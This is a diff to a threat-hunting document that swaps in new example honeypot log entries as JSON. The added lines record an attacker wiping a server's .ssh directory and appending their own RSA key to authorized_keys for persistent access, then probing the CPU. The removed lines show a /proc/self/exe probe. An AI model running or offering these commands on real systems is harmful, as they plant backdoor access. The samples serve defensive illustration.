@@ -67,20 +67,30 @@ Proactively searching through networks to detect and isolate advanced threats th
 
 **Example Attack Pattern JSON Structure**
 ```
-    "211.228.195.98": [
+    "159.75.4.174": [
         {
-            "timestamp": "2023-11-06T07:20:04.287477Z",
-            "event": "command_input",
-            "input": "./oinasf; dd if=/proc/self/exe bs=22 count=1 || while read i; do echo $i; done < /proc/self/exe || cat /proc/self/exe;",
-            "session": "522aa271764c"
-        }
-    ],
-    "49.36.41.217": [
-        {
-            "timestamp": "2023-11-06T07:26:28.362112Z",
+            "timestamp": "2023-11-04T23:00:37.519500Z",
             "event": "command_input",
             "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-            "session": "375d1f771868"
+            "session": "b1efa8762cce"
+        },
+        {
+            "timestamp": "2023-11-04T23:00:38.125037Z",
+            "event": "command_input",
+            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+            "session": "b1efa8762cce"
+        },
+        {
+            "timestamp": "2023-11-04T23:00:38.306419Z",
+            "event": "file_download",
+            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
+            "session": "b1efa8762cce"
+        },
+        {
+            "timestamp": "2023-11-04T23:01:02.521878Z",
+            "event": "command_input",
+            "input": "cat /proc/cpuinfo | grep name | wc -l",
+            "session": "b1efa8762cce"
         },
 ```
 
